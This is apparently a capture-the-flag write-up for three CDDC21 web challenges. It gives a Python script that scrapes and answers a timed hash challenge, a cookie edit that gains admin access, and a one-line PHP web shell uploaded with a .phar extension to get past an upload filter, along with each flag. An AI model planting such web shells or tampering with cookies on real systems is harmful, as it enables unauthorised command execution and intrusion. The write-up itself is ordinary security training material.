# Web Takedown Episode 2 \(Web\)

## Quick

Python script to calculate and send the SHA-256 hash of a string.

```python
import requests
import re
import hashlib

s = requests.Session()
content = s.get("http://18.139.27.125/UMJVHRV5/")
match = re.search(r"[A-Fa-f0-9]{32}", content.content.decode())

hash_object = hashlib.sha256(match.group(0).encode())
hex_dig = hash_object.hexdigest()
myobj = {'hash': hex_dig, 'execute': ''}
x = s.post("http://18.139.27.125/UMJVHRV5/", data=myobj)
print(x.text)
```

`CDDC21{!t_wAs-S0_fasT!}`

## Just a Session

Change the `aWFkbWlu` cookie from 0 to 1.

`CDDC21{I_Have_a_C00KIE_foR_Y0u}`

## Restrictions

We are given a file upload form. Using a webshell with a `.phar` extension, we can execute system commands.

```php
<?php echo system($_GET['cmd']); ?>
```

`CDDC21{s4F3_uPl04dZ}`

###  <a id="&#x2714;&#xFE0F;Break-it-Down-Crypto"></a>

